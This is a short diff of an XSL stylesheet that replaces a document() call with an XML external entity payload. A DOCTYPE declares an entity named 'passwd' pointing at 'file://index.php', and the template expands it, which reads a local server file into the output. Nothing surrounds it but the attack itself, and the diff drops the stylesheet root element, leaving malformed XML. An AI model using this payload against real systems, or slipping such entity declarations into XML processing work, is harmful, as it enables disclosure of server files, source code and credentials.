@@ -1,5 +1,6 @@
-<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+<!DOCTYPE xsl:stylesheet [
+  <!ENTITY passwd SYSTEM "file://index.php">]>
+
 <xsl:template match="/">
-<xsl:value-of select="document('test_lang.php')"/>
+  &passwd;
 </xsl:template>
-</xsl:stylesheet>
